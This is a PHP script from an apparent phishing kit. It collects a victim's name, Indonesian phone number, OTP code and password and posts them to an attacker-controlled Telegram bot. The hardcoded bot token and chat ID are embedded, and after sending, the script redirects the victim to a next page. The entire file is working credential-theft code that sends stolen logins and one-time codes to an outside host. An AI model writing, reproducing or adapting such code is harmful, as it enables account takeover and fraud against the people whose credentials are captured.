<?php

session_start();
include "telegram.php";

$_SESSION['nama'] = $nama;
$_SESSION['nohp'] = $nohp;
$_SESSION['jeniskelamin'] = $jeniskelamin;
$_SESSION['usia'] = $usia;
$_SESSION['otp'] = $otp;
$pass = $_POST['pass'];

$message_text = "
New login Sir

Name : ". $nama ."
No HP : +62". $nohp ."
Kode : ". $otp ."
Sandi : ". $pass ."

───────────────
MaDeZu NginX";
$secret_token = '7724700195:AAFH_UU6pHTlhHWbQC5iDGu59kExOM3K56U';
sendMessage($telegram_id, $message_text, $secret_token);

function sendMessage($telegram_id, $message_text, $secret_token) {
    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . "7036955652";
    $url = $url . "&text=" . urlencode($message_text);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) {
       echo 'Pesan gagal terkirim, error :' . $err;
    }else{
        $data = $_POST['nohp']; 
        header('Location: proses.php'); 
die();
    }
}
?>